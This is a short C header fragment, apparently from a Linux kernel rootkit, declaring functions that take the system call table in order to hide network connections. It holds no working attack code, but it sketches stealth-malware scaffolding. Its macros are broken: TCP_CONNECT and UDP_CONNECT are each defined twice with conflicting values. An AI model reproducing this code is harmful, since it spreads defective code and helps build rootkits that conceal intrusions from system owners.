#define TCP_CONNECT 1
#define UDP_CONNECT 2
#define TCP_CONNECT 3
#define UDP_CONNECT 4

int hide_connect_init(void **real_sys_call_table);
int hide_connect_exit(void **real_sys_call_table);
void 